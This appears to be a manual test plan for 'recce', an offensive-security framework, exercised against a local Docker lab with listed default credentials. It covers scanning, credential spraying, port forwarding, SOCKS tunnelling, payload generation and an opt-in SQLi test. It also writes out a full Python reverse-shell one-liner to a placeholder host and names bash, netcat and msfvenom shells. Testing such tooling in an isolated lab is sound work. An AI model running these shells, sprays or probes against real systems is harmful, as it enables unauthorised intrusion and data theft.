# Recce Test Environment — Manual Test Plan

## Quick Start

```bash
cd test_env
sudo docker-compose up -d --build
# Wait ~30 seconds for all services to initialize
```

Then start recce:
```bash
cd /home/kali/Desktop/projects/recce
python -m recce serve -o test_engagement --port 8443
# Open http://localhost:8443
```

## Target Network (172.20.0.0/24)

| IP           | Hostname      | Services                    | Creds                   |
|------------- |-------------- |---------------------------- |------------------------ |
| 172.20.0.10  | target-linux  | SSH (22)                    | root/toor, testuser/password123 |
| 172.20.0.11  | web-target    | HTTP (80, 8080)             | —                       |
| 172.20.0.12  | db-mysql      | MySQL (3306)                | root/toor, dbuser/dbpass123 |
| 172.20.0.13  | smb-target    | SMB (445), NetBIOS (139)    | smbuser/smbpass123      |
| 172.20.0.14  | ftp-target    | FTP (21)                    | ftpuser/ftppass123      |
| 172.20.0.15  | mail-target   | SMTP (1025), Web UI (8025)  | —                       |
| 172.20.0.16  | win-sim       | RDP-sim (3389), WinRM (5985)| —                       |
| 172.20.0.17  | db-redis      | Redis (6379)                | AUTH redis123           |
| 172.20.0.18  | db-postgres   | PostgreSQL (5432)           | pguser/pgpass123        |

## Test Matrix

### 1. Scanning

#### Quick scan
```bash
python -m recce scan 172.20.0.10-18 -o test_scan --preset quick
```
Expected: Finds SSH, HTTP, MySQL, SMB, FTP, SMTP, RDP, WinRM, Redis, PostgreSQL

#### Standard scan
```bash
python -m recce scan 172.20.0.10-18 -o test_scan --preset standard
```
Expected: Full port sweep, service detection, version info, OS fingerprinting

#### Thorough scan
```bash
python -m recce scan 172.20.0.10-18 -o test_scan --preset thorough
```
Expected: All of standard + UDP top-100, banner scripts, version-all

#### Web scan from UI
- Open the Scan tab → enter `172.20.0.11`
- Verify HTTP content discovery runs
- Check findings appear in Findings tab

### 2. Sessions / Shells

#### Catch a reverse shell (python stager)
```bash
# In recce, start listener on a port (e.g. 4444)
# On target:
ssh root@172.20.0.10 -p 2222  # password: toor
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<YOUR_IP>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```

#### Catch with recce stager (PTY)
- Copy the stager from the Payloads tab
- SSH into target-linux and run it
- Verify session appears in Sessions tab with PTY

#### Auto-upgrade (raw → PTY)
- Catch a raw shell first (nc/bash)
- Click "Upgrade" in the session card
- Verify it auto-detects python and upgrades

#### Session grouping by host
- Catch 2+ shells from the same host
- Verify they group under one collapsible header

### 3. Port Forwarding

#### Through a session
- Catch a session on target-linux (172.20.0.10)
- In Session Tools → Port Forward tab
- Forward 172.20.0.12:3306 (MySQL) to a local port
- Connect locally: `mysql -h 127.0.0.1 -P <local_port> -u root -ptoor`

#### Preset ports
- Try MySQL, PostgreSQL, Redis presets
- Verify each creates a working forward

### 4. Reverse SOCKS Proxy

#### Start tunnel
- Catch a session on target-linux
- Session Tools → Tunnel tab → Start SOCKS Proxy
- Verify SOCKS5 starts on 127.0.0.1:1080

#### Use through proxychains
```bash
# Edit /etc/proxychains.conf → socks5 127.0.0.1 1080
proxychains nmap -sT -p 3306 172.20.0.12
```

#### Use through browser
- Configure browser SOCKS5 proxy → 127.0.0.1:1080
- Browse to http://172.20.0.11

#### Stop tunnel
- Click Stop → verify agent is killed on target

### 5. Credential Spraying

#### SSH spray
From the UI Credentials/Loot tab:
- Test known creds: root/toor against 172.20.0.10
- Test testuser/password123

#### SMB spray
- Test smbuser/smbpass123 against 172.20.0.13

#### Credential quick-connect
- After a spray hit, use the "Deploy enum" button
- Verify it launches enumeration with those creds

### 6. Payloads

#### One-liners (test on target-linux)
SSH into target-linux and try each:
- Python reverse shell
- Bash /dev/tcp reverse shell
- Python PTY stager (copy from Payloads tab)
- Netcat reverse shell

#### msfvenom generation
- Generate ELF payload from Payloads tab
- Transfer to target, chmod +x, execute
- Verify shell catch (will be raw, not PTY)

### 7. Tool Catalog
- Open Sessions → Tool Catalog tab
- Copy fetch command for linpeas.sh
- SSH into target-linux and run it
- Verify download works

### 8. UI Features

#### Keyboard shortcuts
- Alt+1-9: Switch tabs
- ?: Show shortcut help
- Esc: Dismiss panels

#### Cross-tab navigation
- From Exploitation tab, click a host → verify it goes to Scan
- From Exploitation tab, click "Sessions →"
- From Loot/Credentials, click a host IP

#### Host drawer
- Click a host IP in Findings
- Verify drawer opens with findings, sessions, and scan link

### 9. Deploy (credentialed enum)

```bash
python -m recce deploy test_scan root:toor@172.20.0.10 --enum
```
Expected: Runs enum scripts on target, collects results

## T4 — New coverage (scanner expansion C1-C5 + Tier A-D + IPMI + RDP/VNC + containers)

The following targets exercise every net-new probe added in the C1-C5/A-D
tranches, plus IPMI/RDP/VNC/Docker-Registry/Prometheus/Consul/Nomad/Kafka/
Modbus. Each is a lean single-container service on 172.20.0.40+.

| IP           | Hostname          | Service              | Recce probe expected to fire |
|------------- |------------------ |--------------------- |---------------------------- |
| 172.20.0.40  | zookeeper         | ZK 2181 (4LW open)   | `zk_dump` (HIGH), `zk_admin_4lw` (MED), `zk_fingerprint` |
| 172.20.0.41  | kafka             | Kafka 9092 (no SASL) | `kafka_metadata_leaked` (HIGH) |
| 172.20.0.42  | etcd              | v2+v3 unauth read    | `etcd_unauth_read` (CRIT) |
| 172.20.0.43  | consul            | ACL disabled         | `consul_unauth_read` (CRIT) |
| 172.20.0.44  | nomad             | ACL disabled         | `nomad_unauth_read` (CRIT) |
| 172.20.0.45  | prometheus        | admin api + reload   | `prom_admin_writable` (CRIT), `prom_config_readable` (HIGH — leaks fake bearer token), `prom_query_open` (MED) |
| 172.20.0.46  | docker-registry   | v2 anonymous catalog | `dockerreg_anonymous_catalog` (HIGH) |
| 172.20.0.47  | vnc-noauth        | VNC 5900 (no auth)   | `vnc_no_auth` (CRIT) |
| 172.20.0.48  | modbus-target     | Modbus/TCP 502       | `modbus_reachable` (HIGH) |
| 172.20.0.49  | mssql-target      | sa/quick-start pwd   | `mssql_default_creds` (CRIT — matches C4's sweep, TDS-tunneled TLS working end-to-end) |

Existing T1/T2 targets also cover new probes:

| Target                | Probe now exercised |
|---------------------- |-------------------- |
| dvwa (172.20.0.25)    | C1 path enum (phpinfo.php), C2 form + default-cred hint (admin/password), Tier A HTTP methods/CORS/robots |
| juice-shop (.26)      | C1 SPA catch-all suppression, robots.txt /ftp, GraphQL introspection (API depth), JS-secret scan on the Angular bundle |
| dind-target (.24)     | Docker depth — host-mount escape route detection, /containers/{id}/json inspection |
| db-postgres (.18)     | C3 postgres depth — replication-role enum on `pguser` |
| ad-dc (.30)           | AD depth — LAPS attribute readability, gMSA enum, PSO listing, trust findings (if LAPS/gMSA/PSOs configured) |
| mail-target (.15)     | SMTP user enum via VRFY/EXPN/RCPT (MailHog accepts every RCPT, so the enum returns every candidate) |

### Bring up the T4 services

```bash
cd test_env
sudo docker-compose up -d zookeeper kafka etcd consul nomad prometheus \
                         docker-registry vnc-noauth modbus-target
# Optional (heavy — ~1.5 GB RAM):
sudo docker-compose up -d mssql-target
```

### Wait for readiness (Kafka takes the longest — needs ~30s)

```bash
sudo docker-compose ps
# All rows should show "Up" (and "healthy" for the ones with healthchecks)
```

### Scan them all with recce

```bash
python -m recce scan 172.20.0.40-49 -o test_scan_t4 --preset thorough
python -m recce serve -o test_scan_t4 --port 8443
# Open http://localhost:8443 and check the Findings tab
```

### Per-target quick-verify commands

```bash
# Zookeeper 4LW leak
echo dump | nc 172.20.0.40 2181

# etcd v3 unauth read
curl -sX POST http://172.20.0.42:2379/v3/kv/range \
  -d '{"key":"AA==","range_end":"AA=="}' | jq .

# Consul ACL-disabled KV
curl -s http://172.20.0.43:8500/v1/kv/?recurse

# Nomad ACL-disabled jobs
curl -s http://172.20.0.44:4646/v1/jobs

# Prometheus config (bearer token in scrape_configs)
curl -s http://172.20.0.45:9090/api/v1/status/config | jq -r .data.yaml | head -20

# Docker Registry catalog
curl -s http://172.20.0.46:5000/v2/_catalog?n=100

# VNC no-auth handshake (rendered as "None" in security-type list)
echo | nc -w2 172.20.0.47 5900 | head -c 12   # shows "RFB 003.008"

# MSSQL native SQL-auth against sa (C4 sweep will find this)
python -c "from recce.services.db.mssql import sqlauth_login; \
           print(sqlauth_login('172.20.0.49', 1433, 'sa', 'yourStrong(!)Password'))"
```

### 10. Encoder/Decoder toolbox (no test env needed — local operation)

```bash
# CLI:
recce encdec --list                                          # 41-op catalogue
recce encdec base64-decode 'aGVsbG8gd29ybGQ='                # -> hello world
recce encdec jwt-decode 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ0ZXN0In0.abc'
echo -n 'The quick brown fox' | recce encdec sha256
recce encdec hmac-sha256 -k mysecret 'payload text'
recce encdec --chain url-decode json-pretty <<< '%7B%22role%22%3A%22admin%22%7D'

# API (POST to running recce serve):
curl -sX POST http://127.0.0.1:8443/api/encdec/ops | jq '.ops[] | .name' | head
curl -sX POST http://127.0.0.1:8443/api/encdec \
  -H "Content-Type: application/json" \
  -d '{"op":"base64-decode","input":"aGVsbG8="}'

# WebUI: click the 🔀 button in the header (next to 📥 Import).
```

### 11. Active SQLi (C5 — gated tier)

```bash
# GATE: refuses by default
curl -sX POST http://127.0.0.1:8443/api/sqli/test \
  -H "Content-Type: application/json" \
  -d '{"url":"http://172.20.0.25/vulnerabilities/sqli/?id=1&Submit=Submit"}'
# -> HTTP 403 with the opt-in message

# WITH OPT-IN: exercises DVWA's SQLi endpoint
curl -sX POST http://127.0.0.1:8443/api/sqli/test \
  -H "Content-Type: application/json" \
  -d '{"url":"http://172.20.0.25/vulnerabilities/sqli/?id=1&Submit=Submit","active_attacks":true}'
```

## Cleanup

```bash
cd test_env
sudo docker-compose down -v
```
